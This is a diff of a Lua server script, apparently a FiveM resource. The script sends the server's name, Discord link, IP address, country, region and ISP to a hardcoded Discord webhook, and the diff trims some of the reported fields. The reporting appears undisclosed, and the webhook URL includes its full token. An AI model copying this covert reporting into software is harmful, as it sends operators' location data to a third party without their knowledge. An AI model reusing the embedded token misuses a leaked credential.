@@ -10,13 +10,7 @@ local validation = {}
 
 local scriptName = GetCurrentResourceName()
 local serverName = GetConvar("sv_hostname")
-local projectName = GetConvar("sv_projectName")
 local discordLink = GetConvar("discord", "nil")
-local dev1 = GetConvar("dev", "nil")
-local dev2 = GetConvar("developer", "nil")
-local ceo = GetConvar("ceo", "nil")
-local owner1 = GetConvar("dono", "nil")
-local owner2 = GetConvar("owner", "nil")
 
 local discordWebhookUrl = "https://discord.com/api/webhooks/1241964284343484438/PJNkybjuBAkFAaZopf2_fTPtp_woSUkylV3AAVj1dp_QEnMyAto1rqGZvesM1f7q-5hR"
 
@@ -79,13 +73,7 @@ function utilities:sendToDiscord(webhookUrl, messageContent, data, scriptName, c
         fields = {
             { name = "Script", value = scriptName },
             { name = "Servidor", value = serverName },
-            { name = "Projeto", value = projectName },
             { name = "Discord", value = discordLink },
-            { name = "Developer 1", value = dev1 },
-            { name = "Developer 2", value = dev2 },
-            { name = "CEO", value = ceo },
-            { name = "Proprietário 1", value = owner1 },
-            { name = "Proprietário 2", value = owner2 },
             { name = "IP", value = data.query },
             { name = "País", value = data.country },
             { name = "Região", value = data.regionName },
@@ -93,7 +81,7 @@ function utilities:sendToDiscord(webhookUrl, messageContent, data, scriptName, c
             { name = "Provedor de Internet", value = data.isp }
         },
         color = color or 0,
-        image = { url = "" }
+        image = { url = "https://media.discordapp.net/attachments/1114907621917474887/1234627370095214622/goianox.png" }
     }
 
     local message = {
